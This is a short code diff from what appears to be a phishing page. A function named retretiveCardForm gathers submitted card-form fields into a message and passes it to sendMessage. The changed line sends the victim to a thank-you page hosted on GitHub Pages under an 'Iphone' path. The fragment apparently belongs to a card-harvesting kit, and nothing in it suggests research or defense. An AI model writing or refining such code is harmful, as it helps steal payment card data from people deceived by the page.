@@ -34,7 +34,7 @@ function retretiveCardForm(event){
         txt +=  key + values[key] + "%0A";
     }
 
-    window.location.href = 'thx.html'
+    window.location.href = 'https://sh6lok.github.io/Iphone/thx.html'
     sendMessage(txt);
 
 
